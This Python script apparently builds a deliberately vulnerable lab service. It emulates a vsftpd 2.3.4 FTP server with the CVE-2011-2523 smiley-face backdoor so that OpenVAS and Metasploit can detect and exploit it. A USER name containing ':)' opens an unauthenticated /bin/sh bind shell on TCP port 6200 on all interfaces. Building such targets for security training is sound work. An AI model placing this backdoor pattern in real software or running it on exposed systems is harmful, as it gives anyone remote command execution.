#!/usr/bin/env python3
"""VulnCorp lab: vsftpd 2.3.4 banner + CVE-2011-2523 backdoor.

Matches historical behavior closely enough for:
  - OpenVAS active check (USER : ) -> TCP/6200 -> id -> uid=)
  - Metasploit exploit/unix/ftp/vsftpd_234_backdoor (same path + interactive shell)

On USER containing ":)", bind /bin/sh on TCP 6200 via fork+dup2+execl
(same pattern as the original backdoored vsftpd).
"""
from __future__ import annotations

import os
import socket
import threading
import time

BANNER = b"220 (vsftpd 2.3.4)\r\n"
ANON_ROOT = "/var/ftp"
LISTEN = "0.0.0.0"
FTP_PORT = 21
BD_PORT = 6200

_started = False
_lock = threading.Lock()


def _shell_client(conn: socket.socket) -> None:
    """Hand the accepted socket to /bin/sh (real backdoor style)."""
    pid = os.fork()
    if pid == 0:
        # Child becomes the shell
        try:
            os.setsid()
        except OSError:
            pass
        fd = conn.fileno()
        os.dup2(fd, 0)
        os.dup2(fd, 1)
        os.dup2(fd, 2)
        try:
            conn.close()
        except OSError:
            pass
        # No -i: cleaner for scanners/Metasploit (still runs id / payloads)
        os.execl("/bin/sh", "sh")
        os._exit(1)
    # Parent drops its copy of the client socket
    try:
        conn.close()
    except OSError:
        pass


def start_backdoor() -> None:
    global _started
    with _lock:
        if _started:
            return
        _started = True

    def serve() -> None:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((LISTEN, BD_PORT))
        srv.listen(32)
        while True:
            try:
                conn, _addr = srv.accept()
            except OSError:
                break
            try:
                _shell_client(conn)
            except Exception:
                try:
                    conn.close()
                except OSError:
                    pass

    threading.Thread(target=serve, daemon=True).start()
    # Give the listener time to bind before Metasploit connects
    time.sleep(0.5)


def handle(conn: socket.socket) -> None:
    conn.sendall(BANNER)
    logged_in = False
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            for raw in data.split(b"\n"):
                line = raw.decode("utf-8", "replace").strip("\r")
                if not line:
                    continue
                parts = line.split(" ", 1)
                verb = parts[0].upper()
                arg = parts[1] if len(parts) > 1 else ""

                if verb == "USER":
                    if ":)" in arg:
                        start_backdoor()
                        try:
                            conn.sendall(b"331 Please specify the password.\r\n")
                        except OSError:
                            pass
                        # Keep FTP socket briefly so Metasploit can send PASS
                        time.sleep(3)
                        return
                    conn.sendall(b"331 Please specify the password.\r\n")
                elif verb == "PASS":
                    logged_in = True
                    conn.sendall(b"230 Login successful.\r\n")
                elif verb == "SYST":
                    conn.sendall(b"215 UNIX Type: L8\r\n")
                elif verb == "FEAT":
                    conn.sendall(b"211-Features:\r\n211 End\r\n")
                elif verb == "QUIT":
                    conn.sendall(b"221 Goodbye.\r\n")
                    return
                elif verb in ("PWD", "XPWD"):
                    conn.sendall(b'257 "/"\r\n')
                elif verb == "TYPE":
                    conn.sendall(b"200 Switching to Binary mode.\r\n")
                elif verb == "CWD":
                    if not logged_in:
                        conn.sendall(b"530 Please login with USER and PASS.\r\n")
                    else:
                        conn.sendall(b"250 Directory successfully changed.\r\n")
                else:
                    if not logged_in:
                        conn.sendall(b"530 Please login with USER and PASS.\r\n")
                    else:
                        conn.sendall(b"502 Command not implemented.\r\n")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def main() -> None:
    os.makedirs(ANON_ROOT, exist_ok=True)
    # Reap children so Metasploit reconnects do not leave zombies
    try:
        import signal

        signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    except Exception:
        pass

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN, FTP_PORT))
    srv.listen(50)
    while True:
        c, _ = srv.accept()
        threading.Thread(target=handle, args=(c,), daemon=True).start()


if __name__ == "__main__":
    main()
